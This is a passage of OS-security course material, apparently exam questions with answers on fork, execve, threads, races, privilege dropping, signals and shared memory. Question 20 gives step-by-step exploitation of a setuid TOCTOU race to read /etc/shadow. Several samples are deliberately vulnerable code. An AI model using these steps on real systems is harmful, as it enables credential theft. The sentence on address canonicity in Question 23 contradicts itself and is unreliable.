### Question 13 — Counting processes created by a loop

**Q:** How many processes exist when this program reaches `printf`, and how many times is `hello` printed? Generalise to `n` iterations.

```c
#include <stdio.h>
#include <unistd.h>

int main(void) {
    for (int i = 0; i < 3; i++)
        fork();

    printf("hello\n");
    return 0;
}
```

**Answer & Explanation:**

**The key fact.** After `fork` returns, **both** processes continue from the same point with the same loop counter, so **both** execute the remaining iterations. Each iteration therefore **doubles** the number of processes.

| After iteration | Processes |
|---|---|
| start | 1 |
| `i = 0` | 2 |
| `i = 1` | 4 |
| `i = 2` | **8** |

**8 processes** reach the `printf`, and `hello` is printed **8 times** — once by the original and once by each of the **7** children. In general **`n` forks in a loop produce `2^n` processes and `2^n - 1` children.**

**Why the doubling is easy to get wrong.** The intuitive reading is "three forks, three children". That would be true only if the child stopped participating, which requires the child to `exit` (or `break`) — see Question 19, where exactly this omission turns an intended 5 workers into 32 processes.

**A trace of who forks what.** Label the original `O`, and each child by the iteration that created it. A process created at iteration `i` has only iterations `i+1 … 2` left to run, so it forks once per remaining iteration:

| Process | Created at | Iterations left | Children it creates |
|---|---|---|---|
| `O` | — | 0, 1, 2 | 3 — `A`, `B`, `D` |
| `A` | `i = 0` | 1, 2 | 2 — `C`, `E` |
| `B` | `i = 1` | 2 | 1 — `F` |
| `C` | `i = 1` | 2 | 1 — `G` |
| `D`, `E`, `F`, `G` | `i = 2` | none | 0 |

Seven children plus the original is **8**, and the tree is three levels deep. Note there are **two** processes created at `i = 1` — `B` by the original and `C` by `A` — which is the step most hand-traces miss.

**On output ordering.** The eight lines appear in a **nondeterministic order**, because after `fork` parent and child run **concurrently** and the scheduler decides who proceeds. Each `hello\n` is a single short line written with one `write`, so the lines do not interleave *character-wise* in practice, but their order is not guaranteed. To make the order deterministic you must synchronise explicitly — for instance `wait(NULL)` in the parent.

**A detail this program happens to avoid.** `printf` here comes *after* every `fork` and ends in `\n`, so there is nothing buffered at fork time. Move the `printf` before the loop and the answer changes, for reasons Question 15 covers.

---

### Question 14 — `fork`, private address spaces, and the return convention

**Q:** Give the exact console output, and state what the values prove about `fork`.

```c
#include <stdio.h>
#include <unistd.h>
#include <sys/wait.h>

int global = 10;

int main(void) {
    int local = 20;

    pid_t pid = fork();
    if (pid < 0) {
        perror("fork");
        return 1;
    }

    if (pid == 0) {
        global += 5;
        local  += 5;
        printf("child : global=%d local=%d\n", global, local);
    } else {
        wait(NULL);
        printf("parent: global=%d local=%d\n", global, local);
    }

    return 0;
}
```

**Answer & Explanation:**

**The return-value convention** is what selects the branch:

| Return | Meaning |
|---|---|
| `-1` | error (returned in the parent only) |
| `0` | you are the **child** |
| `> 0` | you are the **parent**; the value is the **child's PID** |

**The child** takes the `pid == 0` branch. It began with an exact copy of the parent's memory, so it sees `global = 10` and `local = 20`, adds 5 to each, and prints `15` and `25`.

**The parent** takes the `else` branch. `wait(NULL)` blocks until the child terminates, so the child's line is printed first. The parent then prints **its own** `global` and `local`, which are **still 10 and 20** — the child's writes were made in the child's address space and are invisible here.

**Exact output** — deterministic in this order, because of the `wait`:

```text
child : global=15 local=25
parent: global=10 local=20
```

**What this proves, in two parts.** That the child initially observed 10 and 20 proves the address space **started as a copy** of the parent's. That the parent afterwards still observes 10 and 20 proves the two address spaces are **private and independent**. Both halves are needed: the first alone is consistent with sharing, the second alone is consistent with the child starting blank.

**How that is implemented, and why the demonstration is not a contradiction.** The pages were **not** copied at `fork` — parent and child shared the same physical pages, marked read-only. The child's `global += 5` **faulted**, the handler copied that one 4 KB page for the child and remapped it writable, and the write then landed in the private copy. Sharing is invisible until someone writes; the semantics are "copy", the implementation is "copy on write".

**Why the `pid < 0` check matters and belongs before the `pid == 0` test.** `fork` can fail — process limits, memory pressure. Without the check, `-1` is not `0`, so it falls into the `else` branch: the parent believes it has a child that does not exist, and `wait(NULL)` returns `-1` immediately. Worse patterns exist: code written as `if (fork() == 0) { child work } else { parent work }` will, on failure, run the *parent* path in the only process, and a privileged program written as `if (fork() != 0) { drop privileges }` fails **open**.

---

### Question 15 — `printf` buffering across `fork`

**Q:** Give the exact console output and explain it. Then give the one-line fix and its output.

```c
#include <stdio.h>
#include <unistd.h>

int main(void) {
    printf("A");
    fork();
    printf("B\n");
    return 0;
}
```

**Answer & Explanation:**

**The trap.** `printf` writes into a **userspace buffer** maintained by libc, not directly to the file descriptor. To a terminal, stdout is **line-buffered**, so the buffer is flushed when a newline is written (or at exit, or when full). `"A"` contains **no newline**, so at the moment `fork` is called the character `A` is **still sitting in the buffer, unwritten**.

**What `fork` does to it.** `fork` duplicates the address space — **including libc's stdout buffer and its state**. Both processes now hold a buffer containing `A`.

**What each process then does.** Each appends `B\n`, producing `AB\n` in its own buffer, and the newline flushes it. Two `write` calls occur, one per process, each emitting `AB\n`.

**Exact output** — two lines, each `AB`:

```text
AB
AB
```

**The letter `A` is printed twice although `printf("A")` executed once.** That is the whole lesson: buffered output is *data in the address space*, and `fork` copies data in the address space. Nothing was printed twice at the syscall level — one `write` per process, each carrying a copy of the same buffered byte.

**Order and interleaving.** Which process writes first is **nondeterministic**. The two lines will not interleave character-wise, because each is emitted by a single `write` of a small buffer, but do not rely on that in general: with a larger buffer, or with stdout fully buffered to a file or pipe with output exceeding the buffer, partial flushes can interleave arbitrarily.

**Redirecting makes it worse, not better.** To a file or pipe, stdout is **fully buffered** (typically 4096 bytes), so `B\n` does not flush either — both processes hold `AB\n` until `exit` flushes at termination. The visible result is the same here, but the general failure mode is larger: a program that buffers many lines before forking duplicates *all* of them.

**The fix — flush before forking**, so there is nothing to duplicate:

```c
    printf("A");
    fflush(stdout);          /* or fflush(NULL) for every stream */
    fork();
    printf("B\n");
```

Output becomes:

```text
AB
B
```

`A` is written once, before the fork; then each process contributes its own `B\n`.

**The general rule.** **Flush all output streams before `fork`.** The same reasoning explains why `execve` needs a flush too — the address space, buffer included, is discarded — which is why Question 16 calls `fflush(NULL)` before `execve`, and why libraries that fork internally are careful to flush or to use `_exit`, which does *not* flush, to avoid a child re-emitting the parent's buffered output.

---

### Question 16 — `fork` + `execve`

**Q:** Give the exact console output. Explain why one of the `printf` calls can never execute on a successful run, and why the `fflush` is necessary.

```c
#include <stdio.h>
#include <unistd.h>
#include <sys/wait.h>

int main(void) {
    pid_t pid = fork();
    if (pid < 0) {
        perror("fork");
        return 1;
    }

    if (pid == 0) {
        char *argv[] = { "/bin/echo", "replaced", NULL };
        char *envp[] = { NULL };

        printf("child before\n");
        fflush(NULL);

        execve(argv[0], argv, envp);

        perror("execve");        /* reached only if execve failed */
        _exit(127);
    }

    wait(NULL);
    printf("parent done\n");
    return 0;
}
```

**Answer & Explanation:**

**Exact output**, deterministic because the parent waits:

```text
child before
replaced
parent done
```

**Why `perror("execve")` cannot run on success.** `execve` **replaces the calling process's program**. The kernel:

1. creates a **new, blank address space** — the duplicated parent address space is **completely lost**;
2. has its **loader** read metadata from the binary: which **segments** to load, the **entry point**, and whether an **interpreter** is required (the userspace loader `ld-linux.so`);
3. loads the binary directly for a static binary, or loads the **interpreter** instead for a dynamic binary or script, passing the target program as a parameter;
4. allocates a **stack** and populates it with `argc`, `argv` and the environment;
5. returns to userspace at the program's (or interpreter's) entry point.

Since the calling program's code and stack no longer exist, **there is nothing to return to**. Hence the rule: **a call to `execve` that returns has failed.** It needs no `if` around it — the code after it *is* the error path. `_exit(127)` then terminates the failed child with the conventional "could not exec" status, and `_exit` rather than `exit` avoids flushing buffers the parent also owns a copy of.

**Note the PID does not change.** `execve` replaces the *contents* of the process, not the process. The child that prints `child before` and the `echo` that prints `replaced` are the **same PID**, which is why `wait(NULL)` reaps the right thing.

**Why the `fflush(NULL)` is necessary.** `child before\n` ends in a newline, so to a terminal it flushes immediately — but if stdout is **redirected to a file or a pipe** it is **fully buffered**, and the line sits in libc's buffer. `execve` then **discards the entire address space, buffer included**, and the line is **lost forever** — output silently missing only when redirected, which is a genuinely nasty bug to diagnose. `fflush(NULL)` flushes every stream before the address space is destroyed.

**Why the pairing exists at all.** `fork` **creates** the process; `execve` **replaces its contents**. Neither does the other's job — which is exactly what makes the idiom useful, because the **gap between them runs in the child, with the child's privileges, before the new program exists**. That gap is where a shell sets up pipes and redirection by rearranging file descriptors, and where a privileged program must **drop privileges before exec'ing anything untrusted** (Question 21). A combined "spawn" primitive would offer nowhere to do this.

---

### Question 17 — Threads share one address space

**Q:** Give the console output (with `P` for the process id), and contrast it with what an equivalent `fork` version would print.

```c
/* compile with: gcc -pthread threads.c */
#include <stdio.h>
#include <pthread.h>
#include <unistd.h>

int counter = 0;

static void *worker(void *arg) {
    (void)arg;
    counter += 100;
    printf("thread: counter=%d pid=%d\n", counter, (int)getpid());
    return NULL;
}

int main(void) {
    pthread_t t;

    printf("main  : counter=%d pid=%d\n", counter, (int)getpid());

    pthread_create(&t, NULL, worker, NULL);
    pthread_join(t, NULL);

    printf("main  : counter=%d pid=%d\n", counter, (int)getpid());
    return 0;
}
```

**Answer & Explanation:**

**Exact output**, with `P` the same number on all three lines:

```text
main  : counter=0 pid=P
thread: counter=100 pid=P
main  : counter=100 pid=P
```

The `pthread_join` makes the ordering deterministic by blocking until the worker has finished.

**The two observations, and their causes.**

**`counter` is 100 in `main` after the join.** Threads of one process **share the same address space**, and the implementation of that sharing is that they **use the same page table**. There is only one `counter`, at one virtual address backed by one physical page, so the worker's `+= 100` is directly visible to `main`. No IPC, no syscall, no copy.

**The PID is identical on all three lines.** All threads of a process report the **same PID**. Each also has a distinct **TID**, which is what the kernel actually schedules and what scheduler-related syscalls take. `getpid()` deliberately reports the process, so it cannot distinguish threads — you would need `gettid()`.

**The `fork` contrast.** Replace `pthread_create` with `fork`, and have the child do `counter += 100` and print:

```text
main  : counter=0 pid=P
child : counter=100 pid=C          <- different PID
main  : counter=0 pid=P            <- unchanged
```

Two differences, both diagnostic: the **PID differs**, because `fork` creates a new process; and the parent's `counter` is **still 0**, because the child's write went to a **private copy** of the page (copy-on-write faulted and duplicated it). Question 14 is exactly this experiment.

**The implementation detail that unifies the two.** Both are created by the **same system call, `clone`** — `fork` via libc over `clone`, and `pthread_create` over `clone` too. The difference is entirely in the flags: whether the new task gets a **copy** of the page table or **shares** the existing one. "Process" and "thread" are not two mechanisms but two configurations of one mechanism, which is why the kernel's schedulable unit is neither — it is the **task**.

**The security reading.** The convenience on display — a shared global mutated without ceremony — is the same fact as "there is no isolation between threads". Question 18 shows the correctness cost, and Question 6 the security cost.

---

### Question 18 — An unsynchronised shared counter

**Q:** What does this print? Give the full range of possible values and explain how a value other than the expected one arises.

```c
/* compile with: gcc -pthread race.c */
#include <stdio.h>
#include <pthread.h>

#define ITER 100000

long counter = 0;

static void *bump(void *arg) {
    (void)arg;
    for (int i = 0; i < ITER; i++)
        counter++;
    return NULL;
}

int main(void) {
    pthread_t a, b;

    pthread_create(&a, NULL, bump, NULL);
    pthread_create(&b, NULL, bump, NULL);
    pthread_join(a, NULL);
    pthread_join(b, NULL);

    printf("counter = %ld\n", counter);
    return 0;
}
```

**Answer & Explanation:**

**The output is not predictable.** The intended value is **200,000**, and the possible range is:

```
100,000  ≤  counter  ≤  200,000
```

In practice a run typically prints something well inside that range, and the value **differs from run to run**. Small `ITER` values often print the "correct" answer, which is what makes this class of bug survive testing.

**Why. `counter++` is not one operation.** It compiles to a read-modify-write sequence — load, add, store — and the thread can be **preempted between those steps** (or on another core, execute them concurrently). The lost-update interleaving:

| Step | Thread A | Thread B | `counter` in memory |
|---|---|---|---|
| 1 | load `counter` → 41 | | 41 |
| 2 | | load `counter` → 41 | 41 |
| 3 | add → 42 (in a register) | | 41 |
| 4 | | add → 42 (in a register) | 41 |
| 5 | store 42 | | 42 |
| 6 | | store 42 | **42** |

Two increments executed; **one** took effect. Every such interleaving loses exactly one, so the final value is `200,000` minus the number of lost updates.

**Where the bounds come from.** The maximum, 200,000, occurs if no interleaving ever loses an update. The minimum is **100,000**, not 0: each thread's own loop is sequential, so a thread always eventually stores a value at least as large as the number of increments *it* has performed. One thread's 100,000 increments cannot be entirely erased.

**Why this is a bug and not merely a rare inaccuracy.** In C11 terms two threads accessing the same non-atomic object concurrently, with at least one writing, is a **data race, and a data race is undefined behaviour** — so, per Chapter 2, the entire execution is invalid, not merely the counter. The compiler is entitled to keep `counter` in a register across the loop, in which case the result may be exactly 100,000 with no interleaving at all.

**The connection to the definitions.** `counter++` is a **critical section**, and it needs **both** atomicity rules. Rule 1 (one at a time) is what the table above violates. Rule 2 (finish before another may start) is what rules out the half-completed read-modify-write being observed.

**The fix.** Either a lock — for which the uncontended cost is a userspace atomic and **no syscall**, thanks to the futex — or an atomic type, which is cheaper still for a single word:

```c
#include <pthread.h>
pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;

    pthread_mutex_lock(&lock);
    counter++;
    pthread_mutex_unlock(&lock);
```

```c
#include <stdatomic.h>
atomic_long counter = 0;

    atomic_fetch_add(&counter, 1);      /* one atomic RMW instruction */
```

**Detection.** This is what **ThreadSanitizer** (`-fsanitize=thread`) is for: it reports the racing accesses with both stack traces, where testing the output may not fail for thousands of runs. It is the concurrency analogue of Chapter 2's point that these bugs need **dynamic** analysis, because the failure depends on a schedule that inspection cannot enumerate.

---

## Part 4: Bug Identification & Secure Refactoring

### Question 19 — A worker pool that forks exponentially

**Q:** This is intended to start five workers. Identify all three defects, say how many processes are actually created, and give a corrected version.

```c
#include <stdio.h>
#include <unistd.h>

int main(void) {
    for (int i = 0; i < 5; i++) {
        pid_t pid = fork();
        if (pid == 0) {
            printf("worker %d\n", i);
        }
    }

    printf("done\n");
    return 0;
}
```

**Answer & Explanation:**

**Defect 1 — the child never leaves the loop.** After printing, the child **falls out of the `if` and continues the `for` loop**, forking again. Each iteration doubles the process count, so instead of 5 workers the program creates **`2^5 = 32` processes** — 31 children — and prints `done` **32 times**. The worker lines are duplicated too, since a child created at `i = 0` goes on to print `worker 1` and `worker 2` itself.

**Defect 2 — `fork`'s return value is not checked for failure.** On failure `fork` returns **-1**, which is not `0`, so the failing process takes the parent path and simply continues — no worker is created and nothing reports the problem. This matters most in the inverted idiom `if (fork() != 0) { drop_privileges(); }`, which on failure **fails open**.

**Defect 3 — the parent never reaps its children, creating zombies.** A terminated child remains in the process table as a **zombie** until the parent calls `wait`, because the exit status has to be kept for someone to read. Here the parent exits without waiting: the children are reparented to PID 1, which does reap them, so this particular program leaks nothing permanently. But the pattern is a real resource-exhaustion bug in any long-lived program — a server that forks per request and never waits accumulates zombies until it hits the process limit, at which point **`fork` starts failing**, which combined with defect 2 fails silently. There is also no way to learn whether any worker succeeded.

**The corrected version:**

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>

#define WORKERS 5

int main(void) {
    for (int i = 0; i < WORKERS; i++) {
        pid_t pid = fork();

        if (pid < 0) {                       /* (2) handle failure */
            perror("fork");
            break;                           /* reap what we started */
        }

        if (pid == 0) {                      /* child */
            printf("worker %d\n", i);
            fflush(NULL);                    /* don't duplicate buffered output */
            _exit(0);                        /* (1) the child MUST leave here */
        }
        /* parent continues the loop */
    }

    /* (3) reap every child and report its status */
    for (;;) {
        int status;
        pid_t done = wait(&status);
        if (done < 0)
            break;                           /* ECHILD: no children left */
        if (!WIFEXITED(status) || WEXITSTATUS(status) != 0)
            fprintf(stderr, "worker %d terminated abnormally\n", (int)done);
    }

    printf("done\n");
    return 0;
}
```

**The three fixes, and why each is phrased that way.** `_exit(0)` — not `return`, not `exit` — is what confines the child to one iteration; `_exit` skips the `atexit` handlers and buffer flushes that belong to the parent's copy of the address space, which is what prevents the duplicated-buffer effect of Question 15. `fork < 0` is tested **before** the `== 0` test so failure can never be mistaken for either role. And the reaping loop runs until `wait` reports no children, so it is correct regardless of how many were actually created.

**The security framing.** Uncontrolled process creation is an **availability** attack — a fork bomb is precisely this bug driven deliberately. The system-level defence is not in the program: it is **resource limits** (`RLIMIT_NPROC`) and **cgroups**, which cap what a compromised or buggy process tree can consume. Note this is the same defence recommended against scheduling abuse — cgroups are **scheduler-independent** CPU quotas — because in both cases the kernel cannot distinguish a malicious workload from a legitimate one by inspection, and must simply bound it.

---

### Question 20 — A time-of-check-to-time-of-use race

**Q:** This helper is part of a **setuid-root** utility, intended to let a user print only files they may themselves read. Name the vulnerability class, explain the exploit step by step, and give two different correct fixes.

```c
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>

void dump(const char *path) {
    if (access(path, R_OK) != 0) {          /* TIME OF CHECK  */
        fprintf(stderr, "permission denied\n");
        return;
    }

    int fd = open(path, O_RDONLY);          /* TIME OF USE    */
    if (fd < 0)
        return;

    char buf[4096];
    ssize_t n;
    while ((n = read(fd, buf, sizeof(buf))) > 0)
        write(STDOUT_FILENO, buf, (size_t)n);

    close(fd);
}
```

**Answer & Explanation:**

**The class.** A **time-of-check-to-time-of-use (TOCTOU) race**, a species of race condition in which a security decision is made about a resource and then acted upon, with a window in between during which an attacker changes what the name refers to. It is a **confused deputy**: the privileged program is tricked into misusing authority it holds legitimately.

**Why `access` is the wrong tool.** `access` checks the **real** uid, while `open` uses the **effective** uid. In a setuid-root program those differ — that is the entire point of the check — so the two calls **ask about different subjects**, and they also ask at **different times** about a **name**, not a file. A pathname is not a stable identity; it is a lookup performed anew on each call.

**The exploit.** With `path` under the attacker's control, say `/tmp/attacker/report`:

1. The attacker makes `/tmp/attacker/report` a regular file they own and can read.
2. They call the utility on it. `access(path, R_OK)` succeeds — the real user really can read that file.
3. **In the window between the two calls**, the attacker replaces the path with a **symlink to `/etc/shadow`**, which needs only `rename` over the entry — an atomic operation requiring no privilege.
4. `open(path, O_RDONLY)` now resolves the *new* target, and since the process's effective uid is **root**, it succeeds.
5. The contents of `/etc/shadow` are written to the attacker's stdout.

**Widening the window.** The race looks tight but is entirely winnable. The attacker retries in a loop — the cost of a failed attempt is nothing — and can enlarge the window by forcing slow path resolution (long chains of symlinks, deep directories, a filesystem on slow or network-backed storage) or by loading the machine so the process is preempted between the two calls. Preemptive multitasking means the kernel **can** interrupt the process at any instruction boundary; the attacker just needs one schedule where it does.

**Fix 1 — do not hold the privilege (the better fix).** The check exists only because the process is more privileged than the user it acts for. Remove that gap and the race has nothing to exploit: **drop privileges permanently, then just open the file** and let the kernel's own permission check — which is atomic with the open, and uses the right identity — be the only check.

```c
#define _GNU_SOURCE           /* setresuid/setresgid on glibc */
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>

int drop_privileges_permanently(void) {
    gid_t rgid = getgid();
    uid_t ruid = getuid();

    if (setresgid(rgid, rgid, rgid) != 0)   /* groups first, while still root */
        return -1;
    if (setresuid(ruid, ruid, ruid) != 0)   /* then the user id, irreversibly */
        return -1;

    if (setuid(0) == 0)                     /* must FAIL: verify we really dropped */
        return -1;
    return 0;
}

void dump(const char *path) {
    if (drop_privileges_permanently() != 0) {
        fprintf(stderr, "could not drop privileges\n");
        return;
    }

    int fd = open(path, O_RDONLY);          /* one operation, checked by the kernel */
    if (fd < 0) {
        perror(path);
        return;
    }
    /* ... read and write ... */
    close(fd);
}
```

There is now **no check to race**: a single `open` under the user's own identity either succeeds because they are entitled to the file or fails because they are not.

**Fix 2 — if the privilege must be retained, act on a handle rather than a name.** Open first, then interrogate the **file descriptor**, which refers to a specific inode and cannot be swapped underneath you:

```c
#include <sys/stat.h>         /* struct stat, fstat, S_ISREG */

    int fd = open(path, O_RDONLY | O_NOFOLLOW);   /* refuse a symlink outright */
    if (fd < 0)
        return;

    struct stat st;
    if (fstat(fd, &st) != 0) {                    /* fstat, not stat: same object */
        close(fd);
        return;
    }
    if (!S_ISREG(st.st_mode) || st.st_uid != getuid()) {
        close(fd);                                /* decide using the handle */
        return;
    }
```

**The general rule.** **Check and use the same object, not the same name** — `fstat` over `stat`, `openat` with a directory handle over absolute paths, `O_NOFOLLOW` to refuse symlinks. Any security decision that names a resource, returns to the caller, and then re-resolves that name has a race by construction. And prefer Fix 1: the most reliable way to survive a confused-deputy attack is not to be a deputy — **drop the privilege before touching attacker-controlled input**, which is exactly why the gap between `fork` and `execve` exists.

---

### Question 21 — Dropping privileges in the wrong order

**Q:** A setuid-root program prepares to run a helper on behalf of the invoking user. Identify every defect in this sequence and give a corrected version.

```c
#include <unistd.h>

extern char **environ;

void run_helper(char *const argv[]) {
    setuid(getuid());        /* drop to the real user */
    setgid(getgid());        /* drop to the real group */

    execve("/bin/sh", argv, environ);
}
```

**Answer & Explanation:**

**Defect 1 — the order is backwards, and the second call cannot work.** `setgid` requires privilege. By calling `setuid(getuid())` **first**, the process has already surrendered root, so the subsequent `setgid(getgid())` **fails** — and its failure is ignored (defect 2). The process therefore executes the helper with the user's uid but **still holding the privileged group**, for instance `gid 0`, which grants access to every group-readable-and-writable resource root's group owns.

**The rule: drop group privileges first, while you still have the power to do so, and drop the user id last, because that is the drop that removes the power.**

**Defect 2 — no return value is checked.** `setuid` and `setgid` can fail — for instance against `RLIMIT_NPROC`, a documented and reachable failure mode. An unchecked failure means execution continues **as root** while the programmer believes privileges are gone. This is the canonical **fail-open** bug: the security-relevant step is the one whose failure is silent.

**Defect 3 — `setuid` alone may not be irreversible.** A process has a real, an effective and a **saved** set-user-id. If root remains in the saved uid, the process can **regain** it with `setuid(0)`, so any subsequent code-execution bug in the helper re-escalates. Use `setresuid`/`setresgid` to set all three explicitly, and then **verify** by attempting `setuid(0)` and requiring it to fail.

**Defect 4 — supplementary groups are not cleared.** Changing the primary gid leaves the **supplementary group list** untouched, so memberships granted to the privileged account survive the drop. `setgroups` must be called — while still privileged, hence before the uid drop.

**Defect 5 — `execve`'s environment is inherited wholesale.** Passing `environ` hands attacker-influenced variables to the new program. `getenv` data is untrusted input crossing a trust boundary, and the loader reads some of it: `LD_PRELOAD` and `LD_LIBRARY_PATH` can inject code into a dynamically linked child, and `IFS` and `PATH` change how a shell interprets its input. Pass a **minimal, constructed environment**.

**Defect 6 — the helper is a shell, and `argv` is attacker-influenced.** `/bin/sh` interprets metacharacters, so arguments become a scripting language. Exec the **real program** directly. Note too that `argv[0]` is passed straight through without being set deliberately.

**Defect 7 — `execve`'s own return value is not checked.** If it fails, control continues in a program that believes it has been replaced. Since a returning `execve` **has failed**, the code after it is the error path and must terminate.

**The corrected version:**

```c
#define _GNU_SOURCE           /* setresuid/setresgid on glibc */
#include <stdio.h>
#include <unistd.h>
#include <grp.h>

int run_helper(const char *file, char *const argv[]) {
    gid_t rgid = getgid();
    uid_t ruid = getuid();

    /* (4) clear supplementary groups — needs privilege, so do it first */
    if (setgroups(1, &rgid) != 0)
        return -1;

    /* (1)(3) group id before user id; all three ids at once, irreversibly */
    if (setresgid(rgid, rgid, rgid) != 0)
        return -1;
    if (setresuid(ruid, ruid, ruid) != 0)   /* (2) checked */
        return -1;

    /* (3) verify the drop actually happened and cannot be undone */
    if (getuid() != ruid || geteuid() != ruid || setuid(0) == 0)
        return -1;

    /* (5) a minimal, constructed environment */
    char *envp[] = {
        "PATH=/usr/bin:/bin",
        "IFS= \t\n",
        NULL
    };

    /* (6) exec the program directly — no shell to interpret metacharacters */
    execve(file, argv, envp);

    /* (7) reached only on failure */
    perror("execve");
    return -1;
}
```

**Why the ordering constraint is the memorable part.** Privilege dropping is a **one-way door with a fixed sequence**: everything that *requires* privilege — clearing supplementary groups, setting the gid — must happen **before** the step that *removes* privilege. Get the order wrong and the later calls fail; ignore the return values and you never find out. That is why this belongs in the gap between `fork` and `execve`: it is the only moment at which a program has both the privilege to drop things and a child in which to drop them, before any untrusted program exists.

---

### Question 22 — An unsafe signal handler

**Q:** Identify the three defects and explain the failure mode of each. Give a corrected version.

```c
#include <stdio.h>
#include <signal.h>
#include <stdlib.h>
#include <string.h>

int   quit = 0;
char *log_line;

void handler(int sig) {
    printf("caught signal %d\n", sig);
    log_line = malloc(64);
    if (log_line != NULL)
        strcpy(log_line, "interrupted");
    quit = 1;
}

int main(void) {
    signal(SIGINT, handler);

    while (!quit) {
        /* work */
    }

    printf("exiting: %s\n", log_line ? log_line : "(none)");
    free(log_line);
    return 0;
}
```

**Answer & Explanation:**

**First, the mechanism that makes handlers dangerous.** A signal is a **notification from the kernel to a process**, carrying a **type and no data**. Delivery is **lazy**: the kernel checks for pending signals **immediately before returning to userspace** from a syscall or interrupt. If a handler must run, the kernel **modifies the userspace execution context it is about to restore** — it points the PC at the **handler** and sets up the **stack** with signal information and the means to return, the **`sigreturn`** system call. Control resumes in userspace, the handler runs, and `sigreturn` restores the original frame.

**So a handler is an asynchronous interruption of your own thread at an arbitrary instruction boundary** — the main flow is suspended mid-statement, possibly mid-`malloc`, and the handler runs on the same stack. Every defect below follows from that.

> Worth noticing: the kernel delivers signals by **forging a stack frame and redirecting the PC in userspace** — mechanically the same primitive an attacker wants from a control-flow hijack. The difference is who is authorised. This is also why **sigreturn-oriented programming (SROP)** is a real technique: a forged `sigreturn` frame lets an attacker set every register at once.

**Defect 1 — `printf`, `malloc` and `free` are not async-signal-safe.** They are **not reentrant**: `malloc` mutates a global heap structure under a lock, and `printf` mutates a shared stream buffer under a lock. If `SIGINT` arrives **while the main flow is inside `malloc`**, the handler re-enters `malloc` with the heap's invariants broken and its lock already held by this same thread. Two outcomes: **self-deadlock**, where the process hangs holding a lock it can never release, or **heap corruption** — a memory-safety bug reachable by an attacker who can control signal timing, and in a setuid program that is an escalation primitive. The same applies to `printf` and the stream buffer. Only functions on the **async-signal-safe** list may be called from a handler; `write` is, `printf` is not.

**Defect 2 — `quit` is a plain `int`, so the loop may never terminate.** `while (!quit) { }` contains nothing the compiler can see modifying `quit`, so it may legally **hoist the load out of the loop**, test the value once, and emit an infinite loop. The handler does set the variable, but the optimiser was never told that could happen. The type must be **`volatile sig_atomic_t`**: `volatile` forces a reload on every test, and `sig_atomic_t` guarantees the read and write cannot be torn by a signal arriving mid-access.

**Defect 3 — `signal()` has unspecified, historically divergent semantics.** Whether the disposition is reset to default after one delivery, whether other signals are blocked during the handler, and whether a slow syscall is restarted or fails with `EINTR` all vary. Use **`sigaction`**, which specifies all of it explicitly.

**A fourth, in `main`:** `log_line` is read and `free`d without regard for the handler's write, and a second signal could overwrite the pointer between the read and the `free` — a use-after-free or double-free reachable purely by signal timing.

**The corrected version.** The discipline is: **a handler sets a flag and nothing else**; all real work happens in the main flow, where it is synchronous and may use whatever it likes.

```c
#include <stdio.h>
#include <signal.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>

static volatile sig_atomic_t got_sigint = 0;    /* (2) correct type */

static void handler(int sig) {
    int saved_errno = errno;                    /* never clobber errno */

    got_sigint = sig;                           /* (1) set a flag — that is all */

    /* If you must report something, write() is async-signal-safe. */
    static const char msg[] = "caught SIGINT\n";
    ssize_t ignored = write(STDERR_FILENO, msg, sizeof(msg) - 1);
    (void)ignored;

    errno = saved_errno;
}

int main(void) {
    struct sigaction sa;                        /* (3) sigaction, not signal */
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = SA_RESTART;                   /* restart interrupted syscalls */

    if (sigaction(SIGINT, &sa, NULL) != 0) {
        perror("sigaction");
        return 1;
    }

    while (!got_sigint) {
        /* work */
    }

    /* All non-trivial work happens here, in the main flow. */
    printf("exiting: interrupted by signal %d\n", (int)got_sigint);
    return 0;
}
```

**Two further facts the question sets up.** **A signal with no handler installed causes the OS to kill the process** — which is what makes `SIGSEGV` from Chapter 2's `NULL` dereference a termination rather than a silent continue, and why ignoring `SIGPIPE` changes a server's behaviour on a closed connection. And **saving and restoring `errno`** matters because the handler interrupts code that may be about to inspect it, and a syscall inside the handler would otherwise overwrite it — a bug that manifests as inexplicable failures in code nowhere near the handler.

---

### Question 23 — Shared memory: two defects

**Q:** This sets up a shared counter between a parent and child. Identify the two defects — one in error handling, one in synchronisation — and give a corrected version.

```c
#include <stdio.h>
#include <sys/mman.h>
#include <unistd.h>
#include <sys/wait.h>

#define ITER 100000

int main(void) {
    long *shared = mmap(NULL, sizeof(long),
                        PROT_READ | PROT_WRITE,
                        MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (shared == NULL) {
        perror("mmap");
        return 1;
    }

    *shared = 0;

    if (fork() == 0) {
        for (int i = 0; i < ITER; i++)
            (*shared)++;
        _exit(0);
    }

    for (int i = 0; i < ITER; i++)
        (*shared)++;

    wait(NULL);
    printf("total = %ld\n", *shared);
    return 0;
}
```

**Answer & Explanation:**

**Defect 1 — `mmap` does not report failure with `NULL`.** It returns **`MAP_FAILED`**, which is **`(void *) -1`**, so `shared == NULL` is **never true** and the check is dead code. On failure the program proceeds to dereference `(long *) -1`, writing to address `0xFFFFFFFFFFFFFFFF`. That address is **non-canonical** — bits 48–63 are all ones while bit 47 is set, so it is technically canonical in form but certainly unmapped — and the store raises a fault, so the program dies with a signal instead of printing a diagnostic. Compare `NULL`, whose dereference usually faults because **most operating systems leave the first page unmapped**: both crash, but for different reasons, and neither is the error handling that was intended.

The correct test is `if (shared == MAP_FAILED)`. This is a general trap in the syscall interface: the failure sentinel is **per-call**, not uniform. `malloc` and `fopen` return `NULL`; `mmap` returns `MAP_FAILED`; `open` and most syscalls return `-1`; `fork` returns `-1`; `wait` returns `-1`. Assuming `NULL` means failure because it usually does is how checks end up unreachable.

**Defect 2 — concurrent increments of shared memory with no synchronisation.** `MAP_SHARED | MAP_ANONYMOUS` followed by `fork` gives parent and child **page tables pointing at the same physical page**, so `*shared` is genuinely one object in two address spaces — copy-on-write does *not* apply, which is the entire point of `MAP_SHARED`. `(*shared)++` is therefore exactly Question 18's race, across processes rather than threads: a load-add-store that can interleave and lose updates. The program prints a value somewhere in `[100000, 200000]`, varying per run.

